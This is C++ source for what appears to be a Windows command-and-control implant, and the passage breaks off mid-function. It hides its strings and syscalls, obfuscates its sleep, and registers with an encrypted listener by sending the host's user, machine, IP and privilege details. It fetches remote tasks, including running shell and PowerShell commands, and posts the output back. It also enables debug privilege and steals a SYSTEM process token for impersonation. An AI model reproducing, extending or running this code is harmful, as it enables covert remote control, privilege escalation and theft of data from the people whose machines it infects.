#include "Instance.hpp"
#include "Win32.hpp"
#include "Crypt.hpp"
#include "Http.hpp"
#include "ThreadPool.hpp"
#include "SleepObfuscation.hpp"
#include "StringCrypt.hpp"
#include "SimpleJson.hpp"
#include "SecureString.hpp"
#include "SecureWideString.hpp"
#include "SecureVector.hpp"
#include "SecureException.hpp"
#include <random>
#include <iostream>
#include <sstream>
#include <vector>
#include <codecvt>
#include <format>
#include <iomanip>

// Define storage for static members
HANDLE Instance::Process = nullptr;
DWORD Instance::ProcessId;
HANDLE Instance::Thread = nullptr;
DWORD Instance::ThreadId;
NTSTATUS Instance::NtStatus = 0;
SecureString Instance::Name;
int64_t Instance::ID;
int64_t Instance::ListenerID;
int64_t Instance::Sleep;
int64_t Instance::Jitter;
int64_t Instance::SleepWithJitter;
int64_t Instance::Spoof;
SecureString Instance::IP;
SecureString Instance::ListenerIP;
SecureWideString Instance::WListenerIP;
SecureString Instance::Port;
SecureVector<unsigned char> Instance::AesKey;
SecureVector<unsigned char> Instance::IV;
SecureVector<unsigned char> Instance::XorKey;
SecureWideString Instance::UserAgent;
bool Instance::SSL;
bool Instance::HeapEncrypt;
SecureString Instance::Username;
SecureString Instance::MachineName;
SecureString Instance::OperatingSystem;
SecureString Instance::IntegrityLevel;
int Instance::MaxRetries;
int Instance::ErrorCount;

Instance::Instance() {
    // Private constructor
    MaxRetries = 5;
    ErrorCount = 0;
    Process = DuplicateHandleNative(NtCurrentProcess(), NtCurrentProcess(), NtCurrentProcess(), PROCESS_ALL_ACCESS);
    Thread = DuplicateHandleNative(NtCurrentProcess(), NtCurrentProcess(), NtCurrentThread(), THREAD_ALL_ACCESS);
    ProcessId = GetProcessIdFromHandle(NtCurrentProcess());
    ThreadId = GetThreadIdFromHandle(NtCurrentThread());

    PopulateVariables();
}

// Separate global variable population due to previous sleep obfuscation destroying them requiring repopulation, may be changed in the future
void Instance::PopulateVariables() {
    // Set members manually
    ListenerIP = StringCrypt::DecryptString(StringCrypt::IP_CRYPT);
    // Perform the conversion and store it
    WListenerIP = SecureWideString(ListenerIP.begin(), ListenerIP.end());
    Port = StringCrypt::DecryptString(StringCrypt::PORT_CRYPT);
    SSL = false;
    HeapEncrypt = false;
    UserAgent = StringCrypt::DecryptString(StringCrypt::USERAGENT_CRYPT).c_str();
    ListenerID = 1;
    Sleep = 60;
    Jitter = 0;
    Spoof = SPOOF_TYPE_TIB_COPY;
    // Initialize Http variables
    Http::PopulateVariables();
    // Decrypt AES key
    PrepareKey();
}

void Instance::PrepareKey() {
    /*printf("%s\n", StringCrypt::DecryptString(StringCrypt::AESKEY_CRYPT).c_str());
    printf("%s\n", StringCrypt::DecryptString(StringCrypt::XORKEY_CRYPT).c_str());
    printf("%s\n", StringCrypt::DecryptString(StringCrypt::IV_CRYPT).c_str());*/

    SecureVector<unsigned char> encryptedAESKeyBytes = Crypt::DecodeHex(StringCrypt::DecryptString(StringCrypt::AESKEY_CRYPT));
    XorKey = Crypt::DecodeHex(StringCrypt::DecryptString(StringCrypt::XORKEY_CRYPT));
    IV = Crypt::DecodeHex(StringCrypt::DecryptString(StringCrypt::IV_CRYPT));

    AesKey = Crypt::XorEncryptDecrypt(encryptedAESKeyBytes, XorKey);
    
    //Crypt::PrintHex("AES key: ", AesKey.data(), AesKey.size());
}

ModuleDetails Instance::GetModuleDetails(DWORD dwCryptedHash) {
    PUNICODE_STRING pDllName = NULL, pFullDllName = NULL;
    PPEB_LDR_DATA pLdrData = NULL;
    PLDR_DATA_TABLE_ENTRY pModuleEntry = NULL, pModuleStart = NULL;
    PPEB pCurrentPeb = SystemCalls::Peb;
    ModuleDetails moduleDetails = { 0 };
    pLdrData = pCurrentPeb->Ldr;
    pModuleEntry = pModuleStart = (PLDR_DATA_TABLE_ENTRY)pLdrData->InLoadOrderModuleList.Flink;

    moduleDetails.CryptedHash = dwCryptedHash;

    do {
        pDllName = &pModuleEntry->BaseDllName;
        pFullDllName = &pModuleEntry->FullDllName;
        if (pDllName->Buffer == NULL) {
            //printf("[*] got null...\n");
            break;
        }
#ifdef DEBUG
        printf("Full: %ls\n", pFullDllName->Buffer);
#endif

        if (SystemCalls::djb2_unicode(SystemCalls::SystemCalls::toLower(pDllName->Buffer)) == SystemCalls::xor_hash(dwCryptedHash)) {
            moduleDetails.BaseAddress = (PVOID)pModuleEntry->DllBase;
            break;
        }

        pModuleEntry = (PLDR_DATA_TABLE_ENTRY)pModuleEntry->InLoadOrderLinks.Flink;
    } while (pModuleEntry != pModuleStart);

    if (moduleDetails.BaseAddress == NULL) {
		throw SecureException(Instance::FormatErrorMessage(StringCrypt::DecryptString(StringCrypt::RETRIEVINGMODULEBASEADDRESS_CRYPT)));
	}

    moduleDetails.ImageDosHeader = (PIMAGE_DOS_HEADER)moduleDetails.BaseAddress;
    
    if (moduleDetails.ImageDosHeader->e_magic != IMAGE_DOS_SIGNATURE) {
        throw SecureException(Instance::FormatErrorMessage(StringCrypt::DecryptString(StringCrypt::RETRIEVINGHEADERS_CRYPT)));
    }
    moduleDetails.ImageNtHeader = (PIMAGE_NT_HEADERS)((PBYTE)moduleDetails.BaseAddress + moduleDetails.ImageDosHeader->e_lfanew);
    if (moduleDetails.ImageNtHeader->Signature != IMAGE_NT_SIGNATURE) {
        throw SecureException(Instance::FormatErrorMessage(StringCrypt::DecryptString(StringCrypt::RETRIEVINGHEADERS_CRYPT)));
    }
    
    moduleDetails.ImageExportDirectory = (PIMAGE_EXPORT_DIRECTORY)((PBYTE)moduleDetails.BaseAddress + moduleDetails.ImageNtHeader->OptionalHeader.DataDirectory[0].VirtualAddress);

    return moduleDetails;
}

NT_TIB* Instance::GetTib() {
    NT_TIB* tib = NULL;
    tib = (NT_TIB*)__readgsqword(0x30);
    return tib;
}

void Instance::PrepareSleepTime() {
	// Calculate the sleep time with jitter
    if (Jitter != 0) {
        SleepWithJitter = Sleep + Crypt::GenerateRandomInteger(0, Jitter);
    }
    else {
        SleepWithJitter = Sleep;
    }
}

int Instance::memcmp(const void* ptr1, const void* ptr2, size_t num) {
    const unsigned char* p1 = (const unsigned char*)ptr1;
    const unsigned char* p2 = (const unsigned char*)ptr2;

    while (num--) {
        if (*p1 != *p2) {
            return *p1 - *p2;
        }
        p1++;
        p2++;
    }
    return 0;
}

void* Instance::memcpy(void* dest, const void* src, size_t num) {
    char* destC = (char*)dest;
    const char* srcC = (const char*)src;

    for (size_t i = 0; i < num; i++) {
        destC[i] = srcC[i];
    }

    return dest;
}

SecureString Instance::FormatNtStatus(const SecureString& message, NTSTATUS ntStatus) {
    std::ostringstream oss;
    oss << std::hex << ntStatus; // Convert ntStatus to hex
    std::string hexString = oss.str(); // Get the hex string

    SecureString secureMessage;
    secureMessage.append(message.c_str()); // Assuming 'message' is compatible
    secureMessage.append(StringCrypt::DecryptString(StringCrypt::NTSTATUSFAIL_CRYPT).c_str());
    secureMessage.append(hexString.c_str()); // Append the hex string

    return secureMessage;
}

SecureString Instance::FormatLastError(const SecureString& message) {
    pGetLastError _pGetLastError = (pGetLastError)Win32::Kernel32Table.pGetLastError.pAddress;

    // Convert last error to hex string
    std::ostringstream oss;
    oss << std::hex << _pGetLastError();
    std::string hexString = oss.str();

    SecureString secureMessage;
    secureMessage.append(message.c_str());
    secureMessage.append(StringCrypt::DecryptString(StringCrypt::LASTERRORFAIL_CRYPT).c_str());
    secureMessage.append(hexString.c_str());

    return secureMessage;
}

SecureString Instance::FormatErrorMessage(const SecureString& message) {
    SecureString secureMessage;
    secureMessage.append(message.c_str());
    secureMessage.append(StringCrypt::DecryptString(StringCrypt::FAILED_CRYPT).c_str());

    return secureMessage;
}

DWORD Instance::StringToDWORD(const SecureString& str) {
    unsigned long number = std::stoul(str.c_str()); // Throws std::invalid_argument if conversion can't be performed

    if (number > UINT32_MAX) {
        throw SecureException(StringCrypt::DecryptString(StringCrypt::NUMBERTOOLARGEFORDWORD_CRYPT));
    }

    return static_cast<DWORD>(number);
}

void Instance::Register() {
    // Get information about our current agent
    GetOSVersion();
    GetMachineName();
    GetIntegrityLevel();
    GetUsername();    
    IP = NetworkAdapters::GetAllAdaptersInfo().at(0).IPAddresses.at(0);
    Name = Crypt::GenerateRandomString(Crypt::GenerateRandomInteger(5, 20));

    SimpleJson jsonAgent;

    jsonAgent.addInt64(StringCrypt::DecryptString(StringCrypt::ID_CRYPT).c_str(), 0);
    jsonAgent.addString(StringCrypt::DecryptString(StringCrypt::NAME_CRYPT).c_str(), Name.c_str());
    jsonAgent.addInt64(StringCrypt::DecryptString(StringCrypt::LISTENERID_CRYPT).c_str(), ListenerID);
    jsonAgent.addInt64(StringCrypt::DecryptString(StringCrypt::SLEEP_CRYPT).c_str(), Sleep);
    jsonAgent.addInt64(StringCrypt::DecryptString(StringCrypt::JITTER_CRYPT).c_str(), Jitter);
    jsonAgent.addString(StringCrypt::DecryptString(StringCrypt::EXTERNALIP_CRYPT).c_str(), "");
    jsonAgent.addString(StringCrypt::DecryptString(StringCrypt::INTERNALIP_CRYPT).c_str(), IP.c_str());
    jsonAgent.addString(StringCrypt::DecryptString(StringCrypt::TIME_CRYPT).c_str(), "");
    jsonAgent.addString(StringCrypt::DecryptString(StringCrypt::HOSTNAME_CRYPT).c_str(), MachineName.c_str());
    jsonAgent.addString(StringCrypt::DecryptString(StringCrypt::TOKEN_CRYPT).c_str(), IntegrityLevel.c_str());
    jsonAgent.addString(StringCrypt::DecryptString(StringCrypt::USERNAME_CRYPT).c_str(), Username.c_str());
    jsonAgent.addString(StringCrypt::DecryptString(StringCrypt::OS_CRYPT).c_str(), OperatingSystem.c_str());
    jsonAgent.addBool(StringCrypt::DecryptString(StringCrypt::ACTIVE_CRYPT).c_str(), true);

    // Serialize the JSON object to a string
    SecureString jsonString = jsonAgent.dump();

    // Output the JSON string
    //printf("JSON string: %s\n", jsonString.c_str());

    // Encrypt the JSON string
    SecureString encryptedJson = Crypt::AesEncrypt(jsonString, AesKey, IV);
    
    // Output the encrypted JSON string
    //printf("Encrypted JSON string: %s\n", encryptedJson.c_str());
    
    // POST the encrypted agent and receive the updated version
    encryptedJson = Http::Post(WListenerIP.c_str(), Http::RegisterPath.c_str(), StringToDWORD(Port), encryptedJson);

    // Decrypt the encrypted agent JSON string
    SecureString decryptedJson = Crypt::AesDecrypt(encryptedJson, AesKey, IV, false);

    // Output the decrypted JSON string
    //printf("Decrypted JSON string: %s\n", decryptedJson.c_str());

    ID = jsonAgent.extractID(decryptedJson);
    //std::cout << ID << std::endl;

    // Registration success
    Http::PopulateVariables();
}

// Function to parse a JSON string into a vector of Task structs
std::vector<SecureTask> Instance::ParseTasks(const SecureString& jsonString) {
    SimpleJson json;
    std::vector<SecureTask> tasks;
    try {
		tasks = json.parseTaskList(jsonString);        
	}
    catch (const std::exception& e) {
		throw;
	}
	catch (...) {
		throw;
	}
    
    return tasks;
}

std::vector<SecureTask> Instance::RetrieveTasks() {    
    auto response = Http::Get(WListenerIP.c_str(), Http::TasksPath.c_str(), StringToDWORD(Port));

    int statusCode = response.first;
    SecureString encryptedTasks = response.second;

    //std::cout << "Status code: " << statusCode << std::endl;

    // Check for 204 No Content status code
    if (statusCode == 204) {
#ifdef DEBUG
        std::cout << "No tasks available (204 No Content)." << std::endl;
#endif
        return std::vector<SecureTask>(); // Return an empty vector
    }

    //std::cout << "Encrypted tasks: " << encryptedTasks << std::endl;

    SecureString decryptedTasks = Crypt::AesDecrypt(encryptedTasks, AesKey, IV, false);

    //std::cout << "Decrypted tasks: " << decryptedTasks.c_str() << std::endl;

    std::vector<SecureTask> tasks = ParseTasks(decryptedTasks);

    return tasks;
}

unsigned char* Instance::StringToUnsignedChar(const SecureString& str) {
    // Allocate memory for the unsigned char array
    unsigned char* ucharArray = new unsigned char[str.size() + 1];

    // Copy the contents of the string to the unsigned char array
    Instance::memcpy(ucharArray, str.c_str(), str.size() + 1);

    return ucharArray;
}

void Instance::ExecuteTasks() {
    try {
        std::vector<SecureTask> tasks = RetrieveTasks();
        // Check if the tasks vector is empty, return if so
        if (tasks.empty()) {
            //printf("No tasks to execute\n");
			return;
		}

        for (auto& task : tasks) {
            //printf("Command: %s\n", task.Command->c_str());
            unsigned char* ucharCommandStr = StringToUnsignedChar(*task.Command);

            // "ps" command
            if (SystemCalls::djb2(ucharCommandStr) == SystemCalls::xor_hash(PS_HASH)) {
                //printf("Found ps command\n");
                ThreadPool::SubmitWorkItem(ListProcesses, &task, &task, tasks.size());
            }
            // "shell" command
            else if (SystemCalls::djb2(ucharCommandStr) == SystemCalls::xor_hash(SHELL_HASH)) {
                ThreadPool::SubmitWorkItem(PipeProc, &task, &task, tasks.size());
            }
            // "power" command
            else if (SystemCalls::djb2(ucharCommandStr) == SystemCalls::xor_hash(POWER_HASH)) {
                ThreadPool::SubmitWorkItem(PipeProc, &task, &task, tasks.size());
            }
            // "adapters" command
			else if (SystemCalls::djb2(ucharCommandStr) == SystemCalls::xor_hash(ADAPTERS_HASH)) {
				ThreadPool::SubmitWorkItem(NetworkAdapters::GetAllAdaptersInfo, &task, &task, tasks.size());
			}
        }
        
        std::vector<int> timeouts;
        for (auto& task : tasks) {
			timeouts.push_back(task.Timeout);
		}
        auto largestTimeout = std::max_element(timeouts.begin(), timeouts.end());

        ThreadPool::WaitForCompletion(*largestTimeout * 1000, &tasks);
        printf("Tasks completed\n");

        for (auto& task : tasks) {
            if (!task.TimedOut) {
                printf("Success\n");
                //printf("Result: %s\n", task.Result->c_str());
                task.Result = SanitizeUTF8(*task.Result.get());
                task.Result->jsonEscape();
                task.Active = false;
                task.InQueue = false;
            }
            else {
                printf("Failure\n");
                SecureString result = StringCrypt::DecryptString(StringCrypt::TIMEOUTREACHEDFORTASK_CRYPT);
                result.append(std::to_string(task.Timeout).c_str());
                task.Result = std::make_unique<SecureString>(result);
                task.Active = false;
                task.InQueue = false;
            }

            SimpleJson jsonTask;
            jsonTask.addInt64(StringCrypt::DecryptString(StringCrypt::ID_CRYPT).c_str(), task.ID);
            jsonTask.addInt64(StringCrypt::DecryptString(StringCrypt::AGENTID_CRYPT).c_str(), task.AgentID);
            jsonTask.addString(StringCrypt::DecryptString(StringCrypt::COMMAND_CRYPT).c_str(), task.Command->c_str());
            jsonTask.addStringVector(StringCrypt::DecryptString(StringCrypt::ARGUMENTS_CRYPT).c_str(), task.Arguments);
            jsonTask.addInt64(StringCrypt::DecryptString(StringCrypt::TIMEOUT_CRYPT).c_str(), task.Timeout);
            jsonTask.addBool(StringCrypt::DecryptString(StringCrypt::ACTIVE_CRYPT).c_str(), task.Active);
            jsonTask.addBool(StringCrypt::DecryptString(StringCrypt::SUCCESS_CRYPT).c_str(), task.Success);
            jsonTask.addBool(StringCrypt::DecryptString(StringCrypt::INQUEUE_CRYPT).c_str(), task.InQueue);
            jsonTask.addBool(StringCrypt::DecryptString(StringCrypt::TIMEDOUT_CRYPT).c_str(), task.TimedOut);
            jsonTask.addString(StringCrypt::DecryptString(StringCrypt::CREATETIME_CRYPT).c_str(), task.CreateTime->c_str());
            jsonTask.addString(StringCrypt::DecryptString(StringCrypt::ENDTIME_CRYPT).c_str(), task.EndTime->c_str());
            jsonTask.addString(StringCrypt::DecryptString(StringCrypt::RESULT_CRYPT).c_str(), task.Result->c_str());

            SecureString jsonString = jsonTask.dump();
            //printf("json string: %s\n", jsonString.c_str());
            //getchar();
            SecureString encryptedJson = Crypt::AesEncrypt(jsonString, AesKey, IV);
            Http::Post(WListenerIP.c_str(), Http::TasksPath.c_str(), StringToDWORD(Port), encryptedJson);
        }
    }
    catch (...) {
		throw;
    }
}

void Instance::LogError(SecureString message) {
    SecureString encryptedMessage = Crypt::AesEncrypt(message, AesKey, IV);
    Http::Post(WListenerIP.c_str(), Http::ErrorPath.c_str(), StringToDWORD(Port), encryptedMessage);
}

HANDLE Instance::DuplicateHandleNative(HANDLE SourceProcessHandle, HANDLE TargetProcessHandle, HANDLE TargetHandle, ACCESS_MASK DesiredAccess) {
    HANDLE duplicatedHandle = NULL;
    SyscallPrepare(SystemCalls::SysTable.SysNtDuplicateObject.wSyscallNr, SystemCalls::SysTable.SysNtDuplicateObject.pRecycled);
    Instance::NtStatus = SysNtDuplicateObject(SourceProcessHandle, TargetHandle, TargetProcessHandle, &duplicatedHandle, DesiredAccess, 0, 0);
    if (!NT_SUCCESS(Instance::NtStatus)) {
        return NULL;
    }
    else {
        return duplicatedHandle;
    }
}

// Will get the process ID of any process from its handle
DWORD Instance::GetProcessIdFromHandle(HANDLE ProcessHandle) {
    PROCESS_BASIC_INFORMATION pbi = { 0 };

    SyscallPrepare(SystemCalls::SysTable.SysNtQueryInformationProcess.wSyscallNr, SystemCalls::SysTable.SysNtQueryInformationProcess.pRecycled);
    NtStatus = SysNtQueryInformationProcess(Process, ProcessBasicInformation, &pbi, sizeof(pbi), NULL);
    if (!NT_SUCCESS(NtStatus)) {
        throw SecureException(Instance::FormatNtStatus(StringCrypt::DecryptString(StringCrypt::GETTINGPROCESSINFORMATION_CRYPT), NtStatus));
    }

    return (DWORD)pbi.UniqueProcessId;
}

// Will get the thread ID of any thread from its handle
DWORD Instance::GetThreadIdFromHandle(HANDLE handle) {
    THREAD_BASIC_INFORMATION tbi{ 0 };

    SyscallPrepare(SystemCalls::SysTable.SysNtQueryInformationThread.wSyscallNr, SystemCalls::SysTable.SysNtQueryInformationThread.pRecycled);
    NtStatus = SysNtQueryInformationThread(handle, ThreadBasicInformation, &tbi, sizeof(tbi), NULL);
    if (!NT_SUCCESS(NtStatus)) {
        throw SecureException(Instance::FormatNtStatus(StringCrypt::DecryptString(StringCrypt::QUERYINGTHREADINFORMATION_CRYPT), NtStatus));
    }

    return (DWORD)tbi.ClientId.UniqueThread;
}

void Instance::GetSystem() {    
    pRtlZeroMemory _pRtlZeroMemory = (pRtlZeroMemory)Win32::NtdllTable.pRtlZeroMemory.pAddress;
    pRtlAllocateHeap _pRtlAllocateHeap = (pRtlAllocateHeap)Win32::NtdllTable.pRtlAllocateHeap.pAddress;
    pRtlFreeHeap _pRtlFreeHeap = (pRtlFreeHeap)Win32::NtdllTable.pRtlFreeHeap.pAddress;

    HANDLE pHandle = NULL, tHandle = NULL, nToken = NULL;
    DWORD dwBufSize = 0x1000;
    OBJECT_ATTRIBUTES oa, toa;
    SECURITY_QUALITY_OF_SERVICE qos = { 0 };
    CLIENT_ID ci;
    PSYSTEM_PROCESS_INFORMATION pProcInfo = NULL;
    PVOID pBuffer = NULL, ProcessHeap = SystemCalls::Peb->ProcessHeap;

    try {
        SetDebug();
        _pRtlZeroMemory(&oa, sizeof(oa));        
        _pRtlZeroMemory(&ci, sizeof(ci));

        InitializeObjectAttributes(&toa, NULL, 0, NULL, NULL);
        qos.Length = sizeof(SECURITY_QUALITY_OF_SERVICE);
        qos.ImpersonationLevel = SecurityImpersonation;
        qos.ContextTrackingMode = 0;
        qos.EffectiveOnly = FALSE;
        toa.SecurityQualityOfService = &qos;

        PLDR_DATA_TABLE_ENTRY thisEntry = (PLDR_DATA_TABLE_ENTRY)SystemCalls::Peb->Ldr->InLoadOrderModuleList.Flink;        
        UNICODE_STRING uPath = thisEntry->FullDllName;

        // Native psnapshot
        do {
            pBuffer = _pRtlAllocateHeap(ProcessHeap, 0, dwBufSize);
            if (!pBuffer) {
                // Handle allocation failure
                break;
            }

            SyscallPrepare(SystemCalls::SysTable.SysNtQuerySystemInformation.wSyscallNr, SystemCalls::SysTable.SysNtQuerySystemInformation.pRecycled);
            NtStatus = SysNtQuerySystemInformation(SystemProcessInformation, pBuffer, dwBufSize, &dwBufSize);
            if (!NT_SUCCESS(NtStatus)) {
                _pRtlFreeHeap(ProcessHeap, 0, pBuffer);
                pBuffer = nullptr;
                if (NtStatus != STATUS_INFO_LENGTH_MISMATCH) {
                    // If the failure is not due to a mismatched size, handle other errors
                    throw SecureException(Instance::FormatNtStatus(StringCrypt::DecryptString(StringCrypt::GETTINGSYSTEMINFORMATION_CRYPT), NtStatus));
                }
            }
        } while (NtStatus == STATUS_INFO_LENGTH_MISMATCH);
        
        if (!NT_SUCCESS(NtStatus)) {
            throw SecureException(Instance::FormatNtStatus(StringCrypt::DecryptString(StringCrypt::GETTINGSYSTEMINFORMATION_CRYPT), NtStatus));
        }

        pProcInfo = (PSYSTEM_PROCESS_INFORMATION)pBuffer;
        do {
           if (pProcInfo->ImageName.Buffer == NULL) {
               pProcInfo = (PSYSTEM_PROCESS_INFORMATION)((PBYTE)pProcInfo + pProcInfo->NextEntryOffset);
           }
           else {
               if (SystemCalls::djb2_unicode(SystemCalls::toLower(pProcInfo->ImageName.Buffer)) == SystemCalls::xor_hash(0x32ec7b75)) {
                   ci.UniqueProcess = pProcInfo->UniqueProcessId;
                   ci.UniqueThread = NULL;
                   break;
               }
               pProcInfo = (PSYSTEM_PROCESS_INFORMATION)((PBYTE)pProcInfo + pProcInfo->NextEntryOffset);
           }
        } while (true);

        SyscallPrepare(SystemCalls::SysTable.SysNtOpenProcess.wSyscallNr, SystemCalls::SysTable.SysNtOpenProcess.pRecycled);
        NtStatus = SysNtOpenProcess(&pHandle, PROCESS_QUERY_INFORMATION, &oa, &ci);
        if (!NT_SUCCESS(NtStatus)) {
            throw SecureException(Instance::FormatNtStatus(StringCrypt::DecryptString(StringCrypt::OPENINGPROCESS_CRYPT), NtStatus));
        }

        SyscallPrepare(SystemCalls::SysTable.SysNtOpenProcessToken.wSyscallNr, SystemCalls::SysTable.SysNtOpenProcessToken.pRecycled);
        NtStatus = SysNtOpenProcessToken(pHandle, TOKEN_READ | TOKEN_QUERY | TOKEN_DUPLICATE | TOKEN_ASSIGN_PRIMARY | TOKEN_IMPERSONATE, &tHandle);
        if (!NT_SUCCESS(NtStatus)) {
            throw SecureException(Instance::FormatNtStatus(StringCrypt::DecryptString(StringCrypt::OPENINGTOKEN_CRYPT), NtStatus));
        }

        SyscallPrepare(SystemCalls::SysTable.SysNtDuplicateToken.wSyscallNr, SystemCalls::SysTable.SysNtDuplicateToken.pRecycled);
        NtStatus = SysNtDuplicateToken(tHandle, MAXIMUM_ALLOWED, &toa, FALSE, TokenImpersonation, &nToken);
        if (!NT_SUCCESS(NtStatus)) {
            throw SecureException(Instance::FormatNtStatus(StringCrypt::DecryptString(StringCrypt::DUPLICATINGTOKEN_CRYPT), NtStatus));
        }

        SyscallPrepare(SystemCalls::SysTable.SysNtSetInformationThread.wSyscallNr, SystemCalls::SysTable.SysNtSetInformationThread.pRecycled);
        NtStatus = SysNtSetInformationThread(NtCurrentThread(), ThreadImpersonationToken, &nToken, sizeof(HANDLE));
        if (!NT_SUCCESS(NtStatus)) {
            throw SecureException(Instance::FormatNtStatus(StringCrypt::DecryptString(StringCrypt::SETTINGTHREADINFORMATION_CRYPT), NtStatus));
        }

        // Clean up resources here
        if (pBuffer) {
            _pRtlFreeHeap(ProcessHeap, 0, pBuffer);
        }
        if (pHandle) {
            SyscallPrepare(SystemCalls::SysTable.SysNtClose.wSyscallNr, SystemCalls::SysTable.SysNtClose.pRecycled);
            SysNtClose(pHandle);
        }
        if (nToken) {
            SyscallPrepare(SystemCalls::SysTable.SysNtClose.wSyscallNr, SystemCalls::SysTable.SysNtClose.pRecycled);
            SysNtClose(nToken);
        }
        if (tHandle) {
            SyscallPrepare(SystemCalls::SysTable.SysNtClose.wSyscallNr, SystemCalls::SysTable.SysNtClose.pRecycled);
            SysNtClose(tHandle);
        }
    }
    catch (...) {
        // Clean up resources here
        if (pBuffer) {
            _pRtlFreeHeap(ProcessHeap, 0, pBuffer);
        }
        if (pHandle) {
            SyscallPrepare(SystemCalls::SysTable.SysNtClose.wSyscallNr, SystemCalls::SysTable.SysNtClose.pRecycled);
            SysNtClose(pHandle);
        }
        if (nToken) {
            SyscallPrepare(SystemCalls::SysTable.SysNtClose.wSyscallNr, SystemCalls::SysTable.SysNtClose.pRecycled);
            SysNtClose(nToken);
        }
        if (tHandle) {
            SyscallPrepare(SystemCalls::SysTable.SysNtClose.wSyscallNr, SystemCalls::SysTable.SysNtClose.pRecycled);
            SysNtClose(tHandle);
        }

        // Rethrow exception to the caller
        throw;
    }
}

void Instance::SetDebug() {
    HANDLE cToken = NULL;
    try {
        pLookupPrivilegeValueA _pLookupPrivilegeValueA = (pLookupPrivilegeValueA)Win32::AdvApi32Table.pLookupPrivilegeValueA.pAddress;
        pRtlZeroMemory _pRtlZeroMemory = (pRtlZeroMemory)Win32::NtdllTable.pRtlZeroMemory.pAddress;

        LUID nValue;
        TOKEN_PRIVILEGES tkp = { 0 };
        _pRtlZeroMemory(&tkp, sizeof(TOKEN_PRIVILEGES));

        SyscallPrepare(SystemCalls::SysTable.SysNtOpenProcessToken.wSyscallNr, SystemCalls::SysTable.SysNtOpenProcessToken.pRecycled);
        NtStatus = SysNtOpenProcessToken(Process, TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &cToken);
        if (!NT_SUCCESS(NtStatus)) {
            throw SecureException(Instance::FormatNtStatus(StringCrypt::DecryptString(StringCrypt::OPENINGTOKEN_CRYPT), NtStatus));
        }

        if (!_pLookupPrivilegeValueA(NULL, SE_DEBUG_NAME_A, &nValue)) {
            throw SecureException(Instance::FormatLastError(StringCrypt::DecryptString(StringCrypt::PRIVILEGEVALUELOOKUP_CRYPT)));
        }

        tkp.PrivilegeCount = 1;
        tkp.Privileges[0].Luid = nValue;
        tkp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

        SyscallPrepare(SystemCalls::SysTable.SysNtAdjustPrivilegesToken.wSyscallNr, SystemCalls::SysTable.SysNtAdjustPrivilegesToken.pRecycled);
        NtStatus = SysNtAdjustPrivilegesToken(cToken, FALSE, &tkp, sizeof(tkp), NULL, NULL);
        if (!NT_SUCCESS(NtStatus)) {
            throw SecureException(Instance::FormatNtStatus(StringCrypt::DecryptString(StringCrypt::ADJUSTINGTOKEN_CRYPT), NtStatus));
        }

        // If everything succeeded, close the token handle
        if (cToken) {
			SyscallPrepare(SystemCalls::SysTable.SysNtClose.wSyscallNr, SystemCalls::SysTable.SysNtClose.pRecycled);
			SysNtClose(cToken);
		}
    }
    catch (...) {
        // If an exception was caught, make sure to close the token handle to avoid leaking it
        if (cToken) {
            SyscallPrepare(SystemCalls::SysTable.SysNtClose.wSyscallNr, SystemCalls::SysTable.SysNtClose.pRecycled);
            SysNtClose(cToken);
        }
        // Rethrow the exception to be handled by the caller
        throw;
    }
}

void Instance::Impersonate(DWORD pid) {
    pRtlAllocateHeap _pRtlAllocateHeap = (pRtlAllocateHeap)Win32::NtdllTable.pRtlAllocateHeap.pAddress;
    pRtlFreeHeap _pRtlFreeHeap = (pRtlFreeHeap)Win32::NtdllTable.pRtlFreeHeap.pAddress;
    pRtlZeroMemory _pRtlZeroMemory = (pRtlZeroMemory)Win32::NtdllTable.pRtlZeroMemory.pAddress;

    HANDLE pHandle = NULL, tHandle = NULL, nToken = NULL;
    DWORD dwBufSize = 0x1000;
    OBJECT_ATTRIBUTES oa, toa;
    SECURITY_QUALITY_OF_SERVICE qos = { 0 };
    CLIENT_ID ci;
    PSYSTEM_PROCESS_INFORMATION pProcInfo = NULL;
    PVOID pBuffer = NULL, ProcessHeap = SystemCalls::Peb->ProcessHeap;

    PLDR_DATA_TABLE_ENTRY thisEntry = (PLDR_DATA_TABLE_ENTRY)SystemCalls::Peb->Ldr->InLoadOrderModuleList.Flink;
    UNICODE_STRING uPath = thisEntry->FullDllName;

    try {
        _pRtlZeroMemory(&oa, sizeof(oa));
        _pRtlZeroMemory(&ci, sizeof(ci));

        InitializeObjectAttributes(&toa, NULL, 0, NULL, NULL);
        qos.Length = sizeof(SECURITY_QUALITY_OF_SERVICE);
        qos.ImpersonationLevel = SecurityImpersonation;
        qos.ContextTrackingMode = SECURITY_STATIC_TRACKING;
        qos.EffectiveOnly = FALSE;
        toa.SecurityQualityOfService = &qos;

        // Native psnapshot
        do {
            pBuffer = _pRtlAllocateHeap(ProcessHeap, 0, dwBufSize);
            if (!pBuffer) {
                // Handle allocation failure
                break;
            }

            SyscallPrepare(SystemCalls::SysTable.SysNtQuerySystemInformation.wSyscallNr, SystemCalls::SysTable.SysNtQuerySystemInformation.pRecycled);
            NtStatus = SysNtQuerySystemInformation(SystemProcessInformation, pBuffer, dwBufSize, &dwBufSize);
            if (!NT_SUCCESS(NtStatus)) {
                _pRtlFreeHeap(ProcessHeap, 0, pBuffer);
                pBuffer = nullptr;
                if (NtStatus != STATUS_INFO_LENGTH_MISMATCH) {
                    // If the failure is not due to a mismatched size, handle other errors
                    throw SecureException(Instance::FormatNtStatus(StringCrypt::DecryptString(StringCrypt::GETTINGSYSTEMINFORMATION_CRYPT), NtStatus));
                }
            }
        } while (NtStatus == STATUS_INFO_LENGTH_MISMATCH);

        if (!NT_SUCCESS(NtStatus)) {
            throw SecureException(Instance::FormatNtStatus(StringCrypt::DecryptString(StringCrypt::GETTINGSYSTEMINFORMATION_CRYPT), NtStatus));
        }

        pProcInfo = (PSYSTEM_PROCESS_INFORMATION)pBuffer;
        do {
            if (pid == (ULONG_PTR)pProcInfo->UniqueProcessId) {
                ci.UniqueProcess = pProcInfo->UniqueProcessId;
                ci.UniqueThread = NULL;
                break;
            }
            pProcInfo = (PSYSTEM_PROCESS_INFORMATION)((PBYTE)pProcInfo + pProcInfo->NextEntryOffset);
        } while (true);

        SyscallPrepare(SystemCalls::SysTable.SysNtOpenProcess.wSyscallNr, SystemCalls::SysTable.SysNtOpenProcess.pRecycled);
        NtStatus = SysNtOpenProcess(&pHandle, PROCESS_QUERY_INFORMATION, &oa, &ci);
        if (!NT_SUCCESS(NtStatus)) {
            throw SecureException(Instance::FormatNtStatus(StringCrypt::DecryptString(StringCrypt::OPENINGPROCESS_CRYPT), NtStatus));
